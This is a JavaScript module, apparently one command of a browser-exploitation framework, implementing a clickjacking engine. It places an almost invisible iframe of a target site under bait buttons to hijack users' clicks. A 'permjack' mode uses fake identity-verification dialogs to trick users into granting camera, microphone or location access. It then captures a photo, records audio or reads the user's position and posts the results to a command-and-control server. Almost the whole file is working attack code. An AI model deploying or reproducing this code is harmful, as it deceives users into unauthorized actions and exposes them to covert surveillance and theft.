// ── Clickjacking Engine — hijack clicks to perform actions on other sites ────
// Loads target site in a transparent iframe positioned under the cursor.
// Every click the user makes on the visible page actually clicks buttons
// on the hidden target site — approve OAuth, grant permissions, transfer funds,
// change settings, etc.
//
// Modes:
//   follow   — iframe follows cursor, click hits whatever is under cursor on target
//   fixed    — iframe fixed position, bait button placed over target's button
//   burst    — rapidly reposition iframe to click multiple targets in sequence
//   permjack — specifically designed to hijack browser permission prompts

var C2 = location.protocol + '//' + location.host;
var CID = window.__pzCid || '';
var PARAM = '{{param}}' || '';

// Parse param: "mode:target_url" or "mode:target_url:x,y" for fixed mode
var parts = PARAM.split(':');
var mode = (parts[0] || 'follow').toLowerCase();
// Rejoin remaining parts as URL (URLs contain colons)
var targetUrl = parts.slice(1).join(':');
var fixedX = 0, fixedY = 0;

// Check for coordinates at the end for fixed mode
if (mode === 'fixed') {
  var coordMatch = targetUrl.match(/,(\d+),(\d+)$/);
  if (coordMatch) {
    fixedX = parseInt(coordMatch[1]);
    fixedY = parseInt(coordMatch[2]);
    targetUrl = targetUrl.replace(/,\d+,\d+$/, '');
  }
}

if (!targetUrl) {
  return 'ERROR: param required — format: mode:url (modes: follow, fixed, burst, permjack). Example: follow:https://target.com/settings';
}

// ── Create transparent iframe overlay ────────────────────────────────────────
var container = document.createElement('div');
container.id = '__pzClickjack';
container.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483646;pointer-events:none;overflow:hidden';

var iframe = document.createElement('iframe');
iframe.src = targetUrl;
iframe.id = '__pzCJFrame';
iframe.style.cssText = 'border:none;opacity:0.0001;position:absolute;pointer-events:auto;';
// Size depends on mode
if (mode === 'follow') {
  iframe.style.width = '100%';
  iframe.style.height = '100%';
  iframe.style.top = '0';
  iframe.style.left = '0';
} else {
  iframe.style.width = '800px';
  iframe.style.height = '600px';
}

container.appendChild(iframe);

// ── Bait layer — what the user actually sees ─────────────────────────────────
var bait = document.createElement('div');
bait.id = '__pzCJBait';
bait.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483645;';

// ── Mode implementations ─────────────────────────────────────────────────────

if (mode === 'follow') {
  // ── FOLLOW MODE ────────────────────────────────────────────────────────
  // Iframe covers entire viewport at near-zero opacity.
  // User sees the real page underneath, but clicks hit the iframe.
  // We position the iframe so the target's interactive elements
  // align with where the user is likely to click.

  // The bait content encourages clicking
  bait.innerHTML = '<div style="position:fixed;bottom:20px;right:20px;background:#1a73e8;color:#fff;padding:12px 24px;border-radius:8px;font-family:-apple-system,sans-serif;font-size:14px;cursor:pointer;box-shadow:0 4px 12px rgba(0,0,0,0.2);z-index:2147483644;pointer-events:none">'
    + 'Click anywhere to continue</div>';

  var clickCount = 0;

  // Track clicks through the iframe
  document.addEventListener('click', function(ev) {
    clickCount++;
    fetch(C2 + '/result', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cid: CID, cmd_id: 'clickjack', result: {
        mode: 'follow',
        click: clickCount,
        x: ev.clientX,
        y: ev.clientY,
        target_url: targetUrl,
        timestamp: new Date().toISOString()
      }})
    }).catch(function(){});
  }, true);

  document.body.appendChild(bait);
  document.body.appendChild(container);

} else if (mode === 'fixed') {
  // ── FIXED MODE ─────────────────────────────────────────────────────────
  // Position the iframe so a specific button on the target site
  // aligns exactly with a bait button the user wants to click.
  // Use x,y coordinates to offset the iframe.

  iframe.style.left = (-fixedX) + 'px';
  iframe.style.top = (-fixedY) + 'px';
  iframe.style.width = '1200px';
  iframe.style.height = '800px';

  // Clip to just the button area
  container.style.width = '200px';
  container.style.height = '50px';
  container.style.top = '50%';
  container.style.left = '50%';
  container.style.transform = 'translate(-50%, -50%)';
  container.style.overflow = 'hidden';
  container.style.pointerEvents = 'auto';

  // Bait button that overlays the target's real button
  bait.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:2147483644;pointer-events:none';
  bait.innerHTML = '<div style="background:#4caf50;color:#fff;padding:14px 40px;border-radius:8px;font-family:-apple-system,sans-serif;font-size:16px;font-weight:500;text-align:center;box-shadow:0 4px 12px rgba(0,0,0,0.2)">'
    + 'Claim Your Reward</div>';

  document.addEventListener('click', function(ev) {
    fetch(C2 + '/result', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cid: CID, cmd_id: 'clickjack', result: {
        mode: 'fixed',
        x: ev.clientX, y: ev.clientY,
        target_url: targetUrl,
        iframe_offset: { x: fixedX, y: fixedY },
        timestamp: new Date().toISOString()
      }})
    }).catch(function(){});
  }, true);

  document.body.appendChild(bait);
  document.body.appendChild(container);

} else if (mode === 'burst') {
  // ── BURST MODE ─────────────────────────────────────────────────────────
  // Sequence of iframe repositions to click multiple targets.
  // User clicks once, iframe rapidly repositions to hit multiple buttons.

  var targets = [];
  // Parse coordinates from URL hash or use defaults
  // Format: burst:url#x1,y1;x2,y2;x3,y3
  var hashCoords = targetUrl.split('#');
  if (hashCoords.length > 1) {
    targetUrl = hashCoords[0];
    iframe.src = targetUrl;
    hashCoords[1].split(';').forEach(function(pair) {
      var xy = pair.split(',');
      if (xy.length === 2) targets.push({ x: parseInt(xy[0]), y: parseInt(xy[1]) });
    });
  }

  if (!targets.length) {
    // Default: click center of page at different Y positions
    targets = [
      { x: 400, y: 200 },
      { x: 400, y: 300 },
      { x: 400, y: 400 }
    ];
  }

  container.style.width = '200px';
  container.style.height = '60px';
  container.style.top = '50%';
  container.style.left = '50%';
  container.style.transform = 'translate(-50%, -50%)';
  container.style.overflow = 'hidden';
  container.style.pointerEvents = 'auto';

  iframe.style.width = '1200px';
  iframe.style.height = '800px';

  var burstIdx = 0;

  // Position iframe for first target
  function positionForTarget(idx) {
    if (idx >= targets.length) return;
    var t = targets[idx];
    iframe.style.left = (-t.x + 100) + 'px'; // Center the target button in our clip window
    iframe.style.top = (-t.y + 30) + 'px';
  }
  positionForTarget(0);

  bait.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:2147483644;pointer-events:none';
  bait.innerHTML = '<div style="background:#ff5722;color:#fff;padding:14px 40px;border-radius:8px;font-family:-apple-system,sans-serif;font-size:16px;font-weight:500;text-align:center;box-shadow:0 4px 12px rgba(0,0,0,0.2)">'
    + 'Click to Continue (' + targets.length + ' steps)</div>';

  document.addEventListener('click', function(ev) {
    burstIdx++;
    if (burstIdx < targets.length) {
      // Rapid reposition for next click
      positionForTarget(burstIdx);
      bait.querySelector('div').textContent = 'Click to Continue (' + (targets.length - burstIdx) + ' remaining)';
    } else {
      // All targets clicked
      container.remove();
      bait.remove();
    }

    fetch(C2 + '/result', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cid: CID, cmd_id: 'clickjack', result: {
        mode: 'burst',
        step: burstIdx,
        total_steps: targets.length,
        target_coords: targets[burstIdx - 1],
        target_url: targetUrl,
        timestamp: new Date().toISOString()
      }})
    }).catch(function(){});
  }, true);

  document.body.appendChild(bait);
  document.body.appendChild(container);

} else if (mode === 'permjack') {
  // ── PERMISSION HIJACK MODE ─────────────────────────────────────────────
  // Specifically designed to hijack browser permission prompts.
  // Strategy: trigger a real permission request, then immediately overlay
  // a bait dialog that aligns "Allow" with the browser's real Allow button.
  //
  // Works best on mobile (permission prompt appears as a banner)
  // and on browsers where the prompt position is predictable.

  // Don't need an iframe for this mode — we're hijacking the browser's own UI
  container.remove();

  var permType = targetUrl || 'notifications'; // notifications, camera, microphone, geolocation

  // Step 1: Show a convincing reason to grant the permission
  var permReasons = {
    notifications: { title: 'Stay Updated', desc: 'Enable notifications to receive important security alerts and updates.', icon: '🔔' },
    camera: { title: 'Identity Verification', desc: 'Camera access is required to verify your identity for security purposes.', icon: '📷' },
    microphone: { title: 'Voice Verification', desc: 'Microphone access is needed for voice-based two-factor authentication.', icon: '🎤' },
    geolocation: { title: 'Location Verification', desc: 'Location access helps us verify this sign-in is from your usual location.', icon: '📍' }
  };

  var reason = permReasons[permType] || permReasons.notifications;

  bait.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.5);font-family:-apple-system,sans-serif';
  bait.innerHTML = '<div style="background:#fff;border-radius:16px;padding:32px;max-width:360px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)">'
    + '<div style="font-size:48px;margin-bottom:16px">' + reason.icon + '</div>'
    + '<h3 style="margin:0 0 8px;font-size:18px;color:#1a1a1a">' + reason.title + '</h3>'
    + '<p style="color:#666;font-size:14px;margin:0 0 24px;line-height:1.5">' + reason.desc + '</p>'
    + '<button id="__pzPermBtn" style="background:#1a73e8;color:#fff;border:none;border-radius:8px;padding:12px 32px;font-size:15px;cursor:pointer;width:100%;font-weight:500">Allow</button>'
    + '<div style="margin-top:12px"><a id="__pzPermSkip" href="#" style="color:#999;font-size:12px;text-decoration:none">Not now</a></div>'
    + '</div>';

  document.body.appendChild(bait);

  document.getElementById('__pzPermSkip').onclick = function(e) {
    e.preventDefault();
    bait.remove();
  };

  document.getElementById('__pzPermBtn').onclick = function() {
    // User clicked our fake Allow — now trigger the REAL browser prompt
    // The user is already primed to click Allow
    bait.querySelector('div').innerHTML = '<div style="font-size:14px;color:#666;padding:20px">Please click <strong>Allow</strong> on the browser prompt above to complete verification.</div>';

    var permPromise;
    if (permType === 'notifications') {
      permPromise = Notification.requestPermission().then(function(perm) {
        return { granted: perm === 'granted', type: 'notifications' };
      });
    } else if (permType === 'camera') {
      permPromise = navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
        // Got camera access — capture a frame immediately
        var video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        return new Promise(function(resolve) {
          setTimeout(function() {
            var canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            var img = canvas.toDataURL('image/jpeg', 0.7);
            stream.getTracks().forEach(function(t) { t.stop(); });
            resolve({ granted: true, type: 'camera', image: img });
          }, 500);
        });
      }).catch(function() { return { granted: false, type: 'camera' }; });
    } else if (permType === 'microphone') {
      permPromise = navigator.mediaDevices.getUserMedia({ audio: true }).then(function(stream) {
        // Got mic access — record 5 seconds
        var chunks = [];
        var recorder = new MediaRecorder(stream);
        recorder.ondataavailable = function(e) { chunks.push(e.data); };
        recorder.start();
        return new Promise(function(resolve) {
          setTimeout(function() {
            recorder.stop();
            stream.getTracks().forEach(function(t) { t.stop(); });
            recorder.onstop = function() {
              var blob = new Blob(chunks, { type: 'audio/webm' });
              var reader = new FileReader();
              reader.onload = function() {
                resolve({ granted: true, type: 'microphone', audio: reader.result, duration_s: 5 });
              };
              reader.readAsDataURL(blob);
            };
          }, 5000);
        });
      }).catch(function() { return { granted: false, type: 'microphone' }; });
    } else if (permType === 'geolocation') {
      permPromise = new Promise(function(resolve) {
        navigator.geolocation.getCurrentPosition(
          function(pos) {
            resolve({ granted: true, type: 'geolocation', lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy });
          },
          function() { resolve({ granted: false, type: 'geolocation' }); },
          { enableHighAccuracy: true }
        );
      });
    }

    if (permPromise) {
      permPromise.then(function(result) {
        fetch(C2 + '/result', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ cid: CID, cmd_id: 'clickjack_perm', result: result })
        }).catch(function(){});

        // Show result
        bait.querySelector('div').innerHTML = result.granted
          ? '<div style="padding:20px;text-align:center"><div style="font-size:32px;margin-bottom:8px">✓</div><div style="color:#4caf50;font-weight:500">Verification complete</div></div>'
          : '<div style="padding:20px;text-align:center;color:#f44336">Verification failed — permission denied</div>';

        setTimeout(function() { bait.remove(); }, 2000);
      });
    }
  };

  return 'permission hijack overlay deployed — priming user to grant ' + permType + ' access';

} // end permjack

// ── X-Frame-Options detection ────────────────────────────────────────────────
// Check if the target actually loaded in the iframe
if (mode !== 'permjack') {
  iframe.onerror = function() {
    fetch(C2 + '/result', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cid: CID, cmd_id: 'clickjack', result: {
        error: 'iframe_blocked',
        target_url: targetUrl,
        reason: 'Target likely uses X-Frame-Options or frame-ancestors CSP',
        suggestion: 'Try a different target page or use permjack mode instead'
      }})
    }).catch(function(){});
  };

  // Also detect via load timing — if it loaded too fast, it might be a blank frame
  var loadStart = performance.now();
  iframe.onload = function() {
    var loadTime = Math.round(performance.now() - loadStart);
    fetch(C2 + '/result', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cid: CID, cmd_id: 'clickjack', result: {
        event: 'iframe_loaded',
        target_url: targetUrl,
        load_time_ms: loadTime,
        mode: mode,
        note: loadTime < 50 ? 'Very fast load — iframe may have been blocked by X-Frame-Options (showing about:blank)' : 'Iframe loaded successfully — clickjacking active'
      }})
    }).catch(function(){});
  };
}

return 'clickjacking engine active — mode: ' + mode + ', target: ' + targetUrl;
